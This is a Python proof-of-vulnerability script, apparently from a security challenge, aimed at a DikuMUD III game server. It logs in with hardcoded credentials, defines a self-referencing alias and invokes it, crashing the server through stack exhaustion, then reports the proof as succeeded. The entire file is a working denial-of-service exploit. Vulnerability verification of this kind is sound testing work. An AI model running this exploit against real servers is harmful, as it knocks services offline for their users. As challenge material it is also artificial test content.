from random import getrandbits
from re import T
import sys
import os
import signal
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
import multiprocessing
from pwn import *

import time

go_ahead = b'\xff\xf9'
header = b'\xff\xfc\x01'
footer = b'\xff\xfb\x01\xff'


def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def recvdata(conn, delay=2):
    if conn is None:
        return
    footerfound = False
    recvd = conn.recvuntil(go_ahead, timeout=delay)
    if not recvd:
        return
    if recvd.find(header) >= 0:
        recvd = recvd[recvd.find(header) + 5:]
    if recvd.find(footer) >= 0:
        footerfound = True
        recvd = recvd[:recvd.find(footer)]
    if recvd.find(go_ahead) >= 0 and not footerfound:
        recvd = recvd[:recvd.find(go_ahead)]
    return recvd.decode('utf-8')

def senddata(conn, data, display=1):
    if data is not None:
        if display == 1:
            message='User('+data.replace('\n', ' ').replace('\r', '')+ ')'
            print(message, flush=True)
        conn.sendline(data.encode('utf-8'))

def existingUserLogin(conn, username, password):
    conn.recvuntil(b'By what name do they call you? ').decode('utf-8') # )
    senddata(conn, username)
    result=recvdata(conn)
    ## check for message for "ATTENTION" means bad passwords

    if isBadPassword(result):
        print("Previous bad password")
        senddata(conn, '\n')
        recvdata(conn)
    senddata(conn, password)
    result = conn.recv()
    if result == header:
        return conn.recv()
    else:
        return result

def isBadPassword(message):
    findAttention=message.find('ATTENTION')
    if findAttention == -1:
        return False
    return True

def isLoggedIn(message):
    findWelcome=message.find(b'Welcome back Chess, you last visited DikuMUD III Git Vanilla')
    if findWelcome == -1:
        print('[FAILED] POV Failed: Unable to Login')
        return False
    return True

def findinmessage(haystack, needle):
    if isinstance(haystack, bytes):
        return(haystack.decode('utf-8').lower().find(needle))
    if isinstance(haystack, str):
        return(haystack.lower().find(needle))
    return -1

def sendSingleMessageNoResp(conn, message):
    time.sleep(1)
    response=recvdata(conn)
    if response is not None:
        response=response.replace('\n', ' ').replace('\r', '')
        print(response, flush=True)
    senddata(conn, message)
def retriveMessages(conn, untilmsg):
    tries=10
    while tries > 0:
        time.sleep(1)
        response=recvdata(conn)
        if response is not None:
            if findinmessage(response, "cityguard")!=-1 and findinmessage(response, "janitor")!=-1:
                tries = 10
            response=response.replace('\n', ' ').replace('\r', '')
            found=findinmessage(response, untilmsg)
            if found != -1:
                return found
        tries-=1
    return -1


def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    #print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'], flush=True)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(60)

    ## 1. Login into user
    username='chess'
    password='chess123'
    conn = remote(HOST, PORT)
    result = existingUserLogin(conn, username, password)
    if not isLoggedIn(result):
        print(username + ': Unable to Login')
        conn.close()
        exit(0)
    print("Logged in", flush=True)

    sendSingleMessageNoResp(conn, "alias back !")
    if retriveMessages(conn, "alias for") == -1:
        print('Failed to create alias')
        print('[FAILED] POV Failed')
        conn.close()
        exit(0)
    sendSingleMessageNoResp(conn, "back")
    if retriveMessages(conn, "whoops, you just called an alias with") == -1:
        print('Server disconnected user, verify challenge vme crashed. Stack exhaustion needs to verified via gdb', flush=True)
        print('RESOURCE_EXHAUSTED=stack', flush=True)
        print('[SUCCESS] POV likely Succeeded', flush=True)
        conn.close()
        exit(0)
    print('[FAILED] POV Failed')
    conn.close()

if __name__ == '__main__':
    main()